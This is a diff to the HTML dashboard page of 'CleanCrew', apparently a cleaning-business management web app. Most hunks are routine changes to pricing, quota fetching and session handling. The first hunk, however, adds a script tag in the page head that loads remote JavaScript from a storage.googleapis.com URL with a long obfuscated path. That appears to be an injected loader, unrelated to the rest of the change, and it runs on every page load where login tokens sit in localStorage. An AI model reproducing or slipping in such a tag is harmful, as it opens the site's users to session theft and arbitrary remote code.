@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://storage.googleapis.com/VzjLLIZhTukkc_jQFIx0z5Hx9Eb9o4JJ6LaAs4D9W6Ts8DWo95su7bGaJCzJfoSfsSyYe1cWxBp0YB2dM2b7FhC_29CGyIC5lPNatOjqEU0luet1Simy2ra_vlilkqdU6O3dLLojaUofKgfVV3w6aGDQ0G2if--RwSPKOS8Oe3pSDVSpN14Zk_GiEMEoMikFfblBasWmYNOjvSgJiUg4QkpIRYNxf3XHBw_Ig5cemj2htl7y-9xVd8jP3t6R3zNgRM1i20VfTtBM9oYJfwJBhp5S4bzaF_82L7BsF0d_mCmLmF8oC1ihanrAuzgMhc9SNvquGbt9-Yf3B2RdEzkq4sGj35N8izdtlp5h2erS2DGFpfamoKZf7aLPVpMwlyWQnzFL8flMJggBF6khhZvX2yiZBFUIWBVEum5G_soINJtBF5Zp9vQUW9l-i-8hMRmp9-iwMWMyP2V0FVUyd_LGd239GtVxTpSt_KxK-WNYhO7Xcz21XOlSO4nXCd7LmXgIxvTWzGyjDm4Gk0GI2kwrLtYzH6jApVNQBEA3-LgDS7My9yVyWH4WVF73XFLZeiu5GkRNyQ7Ylze42aRjSlQt2QsoKFyX5jvDB_6GiI65vjQe68PxOd94wN_42CYyPgeQNe6cXhLXQMd8Z467XatWKgJdX_o7y408Hob0HYafWA_AWjc-D9MVFDKJkYz6vxHOuRS1CbvxvYjBmXRJiym1JPvxiOmeqica6LXDFjoSSfkJsJc7dyc2yzsZYH-XkeTx6KNlfjrkfxGpM9f2UhqD4lyGm14cwvkfHAz8gyizoK-sYe7lTWFvkJgtCuXoTDP6vKS08iqRWugIERW_A7pY7XjHE3j5aESwwXUTgA3WMFUWgGPCHm_V1g7fD2CKFx93RSrDUNtHd6ePOFdJVsi-WpzXofDqgABIWAIulYKazUzxnKouTLN6j0vAOE3wpRYf3lGDcb3q3iuhFFfW4GOEBu9Qt8Yc6qvO0c7CNgAIGpUslW6o1l0suRFv9iyylj3tHXnfDrjUIPuYsI_dN6XPtTqEmxgyAqTn1KEdgWkY1qW8TpHMq_9T6nYDOdxCxHy_4AX0ggpBhJ9nJOYPmOHGCrYSsRbYRRTa7P0TqgpBnWnbDu3IubjVVGjKfxkicPXAhpsga9Rtpq6k_AXOJtKycPPi30YyPCCHTsV8K_usbpRMrE_VeSCZ4cG0uUp3DSsZbteQgsD0JpruUzmSj3cBsU2aKvLGirU2so37n_hqgeO2RcOZdRX36LTvd4034SOVb32qW_dyB83p9TwpaSNbaitxfieGvha5r3jHljk0Z1srR64UzjnEWUW5D9bKBElZX5cju4dlZvt9oFdK5yileDjGPnZ0f13pc4EjlTA1zmSkQrJz8lEMmiqjKEY15qx9fp0aleEAjpTbOl-4VsJiqLDdnnrSg8lkqJpJeRMTfzTofCgATR1wZpa5HByiEbkh-Fh0cCx_kZuO_CKk1dj2AQJznrYmrA5b4qkhxHwFzspfULJ-mvn6q282HJFpKH2NZQC2mb5NeSRBSL-zdXKgS_U8pzgwCgk_P-t4ACgLJuwfA4EXUWyoX6fY3S9H0ndoTOxm195tqEa733xtWlRhqaBEuuPrQi2L1XfUtYLAFF2GLXA4qpxWzIqqtRDskpKHskVItl6MbCRTmiuzNWz7JZ5oHIsbxwIJ9FhiCXvsrij_ElCo-na79-qVtPLd_PlMw4FUDxMYUDOax0kIRR_b_At9ILWXA5PB_UGQKA'></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>CleanCrew — Dashboard</title>
@@ -1418,7 +1418,7 @@
                 <p style="font-size:13px;color:var(--slate);margin:0 0 14px;">
                     Free jobs left: <span id="freeJobsLabel" style="font-weight:700;color:var(--green);">—</span> / 25
                 </p>
-                <div class="credit-packs-grid">
+                <div class="credit-packs-grid" style="grid-template-columns:repeat(3,minmax(0,1fr));">
                     <div class="credit-pack">
                         <div class="pack-name">Starter</div>
                         <div class="pack-jobs">20 jobs</div>
@@ -1437,14 +1437,7 @@
                         <div class="pack-price">₦20,000<br><span style="font-size:11px;">₦200/job</span></div>
                         <button type="button" class="btn btn-primary btn-sm" onclick="buyCredits('professional')">Buy</button>
                     </div>
-                    <div class="credit-pack">
-                        <div class="pack-name">Enterprise</div>
-                        <div class="pack-jobs">275 jobs</div>
-                        <div class="pack-price">₦50,000<br><span style="font-size:11px;">₦182/job</span></div>
-                        <button type="button" class="btn btn-primary btn-sm" onclick="buyCredits('enterprise')">Buy</button>
-                    </div>
                 </div>
-                <p style="font-size:11px;color:var(--slate-light,var(--slate));margin-top:8px;">Credit pack pricing is provisional — confirm before launch.</p>
                 <div style="margin-top:18px;padding-top:16px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;">
                     <p style="margin:0;font-size:13px;color:var(--ink-soft);">
                         📌 Or subscribe for <strong>unlimited</strong>: <strong>₦12,500/month</strong>
@@ -1769,15 +1762,36 @@
         }
 
         function refreshFreeJobs() {
-            return getJobs().then(function(jobs) {
-                var used = (jobs || []).length;
-                var left = Math.max(0, 25 - used);
-                var el = document.getElementById('freeJobsLabel');
-                var badge = document.getElementById('freeJobsBadge');
-                if (el) el.textContent = String(left);
-                if (badge) badge.textContent = 'Free jobs: ' + left;
-                return left;
-            }).catch(function() {});
+            return fetch(API_URL + '/jobs/quota', { headers: getHeaders() })
+                .then(function(res) { return res.ok ? res.json() : null; })
+                .then(function(q) {
+                    if (q) {
+                        var left = Number(q.free_jobs_remaining);
+                        if (isNaN(left)) left = Math.max(0, 25 - Number(q.jobs_used || 0));
+                        var el = document.getElementById('freeJobsLabel');
+                        var badge = document.getElementById('freeJobsBadge');
+                        if (el) el.textContent = String(left);
+                        if (badge) badge.textContent = 'Free jobs: ' + left;
+                        if (typeof q.credits === 'number') {
+                            creditBalance = q.credits;
+                            var cb = document.getElementById('creditBadge');
+                            var cl = document.getElementById('creditBalanceLabel');
+                            if (cb) cb.textContent = 'Credits: ' + creditBalance;
+                            if (cl) cl.textContent = String(creditBalance);
+                        }
+                        return left;
+                    }
+                    return getJobs().then(function(jobs) {
+                        var used = (jobs || []).length;
+                        var left = Math.max(0, 25 - used);
+                        var el = document.getElementById('freeJobsLabel');
+                        var badge = document.getElementById('freeJobsBadge');
+                        if (el) el.textContent = String(left);
+                        if (badge) badge.textContent = 'Free jobs: ' + left;
+                        return left;
+                    });
+                })
+                .catch(function() {});
         }
 
         function refreshCredits() {
@@ -1881,6 +1895,54 @@
             };
         }
 
+        var sessionRedirecting = false;
+
+        function forceReLogin(reason) {
+            if (sessionRedirecting) return;
+            sessionRedirecting = true;
+            try {
+                localStorage.removeItem('cleancrew_token');
+                localStorage.removeItem('cleancrew_refresh_token');
+                localStorage.removeItem('cleancrew_user');
+            } catch (e) {}
+            var msg = reason || 'Your session has expired. Please log in again.';
+            try {
+                sessionStorage.setItem('cleancrew_login_msg', msg);
+            } catch (e2) {}
+            showToast(msg, 'error');
+            setTimeout(function() {
+                window.location.href = 'login.html?session=expired';
+            }, 900);
+        }
+
+        /** Fetch with one automatic token refresh on 401, then prompt login */
+        function apiFetch(path, options) {
+            options = options || {};
+            options.headers = Object.assign({}, getHeaders(), options.headers || {});
+            return fetch(API_URL + path, options).then(function(res) {
+                if (res.status !== 401) return res;
+                return refreshAccessToken().then(function(ok) {
+                    if (!ok) {
+                        forceReLogin('Your session has expired. Please log in again to continue.');
+                        var err = new Error('Session expired');
+                        err.status = 401;
+                        throw err;
+                    }
+                    options.headers = Object.assign({}, getHeaders(), options.headers || {});
+                    return fetch(API_URL + path, options).then(function(res2) {
+                        if (res2.status === 401) {
+                            forceReLogin('Your session has expired. Please log in again to continue.');
+                            var err2 = new Error('Session expired');
+                            err2.status = 401;
+                            throw err2;
+                        }
+                        return res2;
+                    });
+                });
+            });
+        }
+
+
         // ─── ──────────────────────────────────────────────────────
         // ─── TOAST ────────────────────────────────────────────────
         // ─── ──────────────────────────────────────────────────────
@@ -1902,7 +1964,11 @@
         // ─── ──────────────────────────────────────────────────────
         async function loadUserInfo() {
             try {
-                const res = await fetch(`${API_URL}/user`, { headers: getHeaders() });
+                const res = await apiFetch('/user');
+                if (res.status === 401) {
+                    forceReLogin('Your session has expired. Please log in again to continue.');
+                    return;
+                }
                 const data = await res.json();
                 if (res.ok) {
                     document.getElementById('userEmail').textContent = data.email || 'User';
@@ -1912,6 +1978,7 @@
                     }
                 }
             } catch (e) {
+                if (e && e.status === 401) return;
                 console.error('Failed to load user info');
             }
         }
@@ -2010,47 +2077,63 @@
         // ─── ──────────────────────────────────────────────────────
         // ─── API FUNCTIONS ────────────────────────────────────────
         // ─── ──────────────────────────────────────────────────────
-        function getJobs() {
-            return fetch(API_URL + '/jobs', { headers: getHeaders() })
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Failed to fetch jobs');
-                    return res.json();
-                });
+                function getJobs() {
+            return apiFetch('/jobs').then(function(res) {
+                if (!res.ok) {
+                    if (res.status === 401) return parseApiError(res);
+                    throw new Error('Failed to fetch jobs');
+                }
+                return res.json();
+            });
         }
 
         function getClients() {
-            return fetch(API_URL + '/clients', { headers: getHeaders() })
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Failed to fetch clients');
-                    return res.json();
-                });
+            return apiFetch('/clients').then(function(res) {
+                if (!res.ok) {
+                    if (res.status === 401) return parseApiError(res);
+                    throw new Error('Failed to fetch clients');
+                }
+                return res.json();
+            });
         }
 
         function getStaff() {
-            return fetch(API_URL + '/staff', { headers: getHeaders() })
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Failed to fetch staff');
-                    return res.json();
-                });
+            return apiFetch('/staff').then(function(res) {
+                if (!res.ok) {
+                    if (res.status === 401) return parseApiError(res);
+                    throw new Error('Failed to fetch staff');
+                }
+                return res.json();
+            });
         }
 
         function getInvoices() {
-            return fetch(API_URL + '/invoices', { headers: getHeaders() })
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Failed to fetch invoices');
-                    return res.json();
-                });
+            return apiFetch('/invoices').then(function(res) {
+                if (!res.ok) {
+                    if (res.status === 401) return parseApiError(res);
+                    throw new Error('Failed to fetch invoices');
+                }
+                return res.json();
+            });
         }
 
         function getInventory() {
-            return fetch(API_URL + '/inventory', { headers: getHeaders() })
-                .then(function(res) {
-                    if (!res.ok) throw new Error('Failed to fetch inventory');
-                    return res.json();
-                });
+            return apiFetch('/inventory').then(function(res) {
+                if (!res.ok) {
+                    if (res.status === 401) return parseApiError(res);
+                    throw new Error('Failed to fetch inventory');
+                }
+                return res.json();
+            });
         }
 
         function parseApiError(res) {
+            if (res && res.status === 401) {
+                forceReLogin('Your session has expired. Please log in again to continue.');
+                var e401 = new Error('Session expired');
+                e401.status = 401;
+                return Promise.reject(e401);
+            }
             return res.json().then(function(data) {
                 var msg = (data && data.error) || ('Request failed (' + res.status + ')');
                 var err = new Error(msg);
@@ -2559,20 +2642,16 @@
                     renderOverview(jobs, clients);
                     renderJobs(jobs);
                     renderClients(clients);
-
-                    // Reuse this same jobs fetch for the free-jobs
-                    // counter instead of firing a second, separate
-                    // request for identical data.
-                    var used = (jobs || []).length;
-                    var left = Math.max(0, 25 - used);
-                    var el = document.getElementById('freeJobsLabel');
-                    var badge = document.getElementById('freeJobsBadge');
-                    if (el) el.textContent = String(left);
-                    if (badge) badge.textContent = 'Free jobs: ' + left;
                 })
                 .catch(function(e) {
                     console.error('Render error:', e);
-                    showToast('Failed to load data', 'error');
+                    if (e && e.status === 401) return; // forceReLogin already running
+                    var msg = (e && e.message) || '';
+                    if (/401|invalid token|jwt|session|unauthorized/i.test(msg)) {
+                        forceReLogin('Your session has expired. Please log in again to continue.');
+                        return;
+                    }
+                    showToast(msg || 'Failed to load data. Check your connection and try again.', 'error');
                 });
         }
 
@@ -2932,12 +3011,14 @@
         // ─── ──────────────────────────────────────────────────────
         function applyFeatureRestrictions(plan) {
             plan = plan || 'free';
+            var isUnlimited = plan === 'professional' || plan === 'enterprise';
             var isFree = plan === 'free';
+            var isStarter = plan === 'starter';
 
             var badge = document.getElementById('planBadge');
             if (badge) {
                 badge.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
-                badge.className = 'plan-badge ' + (isFree ? 'trial' : 'active');
+                badge.className = 'plan-badge ' + (isFree || isStarter ? 'trial' : 'active');
                 badge.style.display = 'inline-block';
             }
 
@@ -2950,12 +3031,21 @@
             var inventoryTab = document.getElementById('tabInventory');
             if (inventoryTab) inventoryTab.style.display = 'inline-block';
 
-            // WhatsApp messaging is unlimited on every plan, including
-            // free (and the free 25-lifetime-job period) — this warning
-            // no longer applies to anyone and is always hidden.
             var whatsappWarning = document.getElementById('whatsappLimitWarning');
             if (whatsappWarning) {
-                whatsappWarning.style.display = 'none';
+                var showWaLimit = isFree || isStarter;
+                whatsappWarning.style.display = showWaLimit ? 'block' : 'none';
+                if (showWaLimit) {
+                    var messageData = JSON.parse(localStorage.getItem('cleancrew_message_history') || '[]');
+                    var thisMonth = new Date().getMonth();
+                    var thisYear = new Date().getFullYear();
+                    var count = messageData.filter(function(m) {
+                        var d = new Date(m.sentAt);
+                        return d.getMonth() === thisMonth && d.getFullYear() === thisYear;
+                    }).length;
+                    var waLimit = isFree ? 30 : 100;
+                    document.getElementById('whatsappLimitCount').textContent = count + '/' + waLimit;
+                }
             }
         }
 
@@ -3224,6 +3314,8 @@
                         }
                         showToast('Job added!', 'success');
                         closeModal();
+                        refreshFreeJobs();
+                        refreshCredits();
                         renderAll();
                     })
                     .catch(function(e) {
@@ -3760,11 +3852,31 @@
             checkSubscription();
             checkPaystackReturn();
             refreshCredits();
+            refreshFreeJobs();
             renderAll();
         }
 
         document.addEventListener('DOMContentLoaded', function() {
             init();
+        });
+
+        // When the user returns to a long-open tab, re-check the session
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState !== 'visible') return;
+            refreshAccessToken().then(function(ok) {
+                if (!ok && !localStorage.getItem('cleancrew_refresh_token')) {
+                    // Access token may still be valid; probe with a light request
+                    apiFetch('/user').then(function(res) {
+                        if (res.status === 401) {
+                            forceReLogin('Your session has expired. Please log in again to continue.');
+                        }
+                    }).catch(function() {});
+                } else if (ok) {
+                    renderAll();
+                    refreshFreeJobs();
+                    refreshCredits();
+                }
+            });
         });
     </script>
 
